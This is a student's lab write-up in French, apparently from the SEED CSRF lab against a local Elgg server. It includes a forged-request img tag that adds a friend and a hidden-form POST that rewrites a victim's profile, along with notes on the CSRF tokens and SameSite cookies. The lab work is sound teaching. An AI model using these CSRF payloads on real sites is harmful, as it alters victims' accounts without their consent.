# Task 1. Nothing to do

# Task 2. 

Forme de la requête d'un ajout d'ami
```
[GET]

http://www.seed-server.com/action/friends/add?friend=IDOfTheFriendToAdd&__elgg_ts=timestamp&__elgg_token=token&__elgg_ts=timestamp&__elgg_token=token
```

Pas besoin du timestamp et du token d'Alice -> cette sécurité a été désactivée pour ce TP.

```
http://www.seed-server.com/action/friends/add?friend=59
```

A mettre dans adduser.html :
```
<img src="http://www.seed-server.com/action/friends/add?friend=59" alt="image" width="1" height="1" />
```

Puis envoyer un msg à Alice, qui clique dessus

# Task 3.

```
// The following are form entries need to be filled out by attackers.
// The entries are made hidden, so the victim won't be able to see them.
fields += "<input type='hidden' name='name' value='Alice'>";
fields += "<input type='hidden' name='briefdescription' value='Samy is the love of my life'>";
fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
fields += "<input type='hidden' name='guid' value='56'>";

// Create a <form> element.
var p = document.createElement("form");

// Construct the form
p.action = "http://www.seed-server.com/action/profile/edit";
p.innerHTML = fields;
p.method = "post";

```

	Question 1 : quand on fait une requête type add friend depuis le compte de Boby, on peut voir le guid de Alice
	Question 2 : oui il le peut, car dans les cookies, on retrouve le username de l'utilisateur et son guid

# Task 4.

"Docker ps" -> puis chercher le conteneur qui a pour nom "image_www"

Puis : ```cd /var/www/elgg/vendor/elgg/elgg/engine/classes/Elgg/Security```
Et ```nano Csrf.php```, afin de le modifier comme suit :

Vous trouverez la méthode ``validate`` ainsi :

```
public function validate(Request $request) {
                return; // Added for SEED Labs (disabling the CSRF countermeasure)
```

Et il faut remplacer le premier ``return`` par :

```
public function validate(Request $request) {
```

Puis sauvegarder, quitter nano et quitter le conteneur (quitter nano : ``ctrl + x`` et ``y``, puis quitter le conteneur : ``exit``)

### Task 4.1 : Please point out the secret tokens in the captured HTTP requests. 



### Task 4.2 : Please explain why the attacker cannot send these secret tokens in the CSRF attack; what prevents them from finding out the secret tokens from the web page ?

# Task 5

Avoir ajouté : 10.9.0.5 www.example32.com dans /etc/hosts
Puis se rendre sur www.example32.com :

#### Question 1 :

Lien A : requêtes à example32.com faites depuis example32.com, donc requêtes considérées de confiance par le navigateur, donc tous les cookies s'affichent peu importe le type de requête (GET depuis un lien, GET par un formulaire, POST, ...)

Lien B : requêtes à example32.com faites depuis attacker32.com : 
- pour le GET via le lien et le GET via le formulaire : tout s'affiche sauf cookie-strict  -> le site attacker32.com ne valide pas le critère "avoir le nom de domaine example32.com", autrement dit, attacker32.com n'est pas example32.com, donc le navigateur détecte qu'il s'agit d'un site étranger à example32.com et limite le cookie aux requêtes venant de example32.com. Notamment, grâce au système des cookies SameSite, les cookies peuvent être "statués" lax ou strict, autrement dit qu'il est possible pour un site de dire "ce cookie n'a pas d'importance et peut être utilisé par d'autres sites" ou au contraire de dire "ce cookie peut seulement être utilisé sur mon site" ;
- pour le POST via le formulaire : seul le cookie-normal s'affiche -> Cela en raison du fait que cookie-strict ne permet déjà pas d'être utilisé dans une requête GET depuis attacker32.com, il n'est donc pas non plus permis de l'utiliser dans une requête POST réalisée depuis attacker32.com. Quant à cookie-lax, en réalité, malgré son statut "laxiste", une condition est nécessaire pour pouvoir utiliser un cookie-lax dans sa requête : il faut que ça soit une requête dite "safe", c'est-à-dire des requêtes "GET" ou "HEAD".

Dans tous les cas expliqués ci-dessous, tous les autres cookies s'affichent tout le temps (city, country, traffic_target, ...), ce qui est normal puisqu'ils n'ont aucun statut particulier à l'instar de "cookie-normal" (c'est-à-dire que ce ne sont pas des Cookies SameSite tels que cookie-lax ou cookie-strict).

#### Question 2 :

Si certains cookies SameSite sont obligatoires afin de réaliser une requête vers un serveur, l'attaquant ne pourra pas les récupérer si les bons statuts sont mis sur les cookies. Ainsi, si une requête cross-site est réalisée, le serveur recevra la requête sans les cookies nécessaires, et constatera alors que la requête a été réalisée depuis un site tiers. Alors qu'au contraire, les requêtes réalisées depuis le même site contiendront les cookies nécessaires.
#### Question 3 :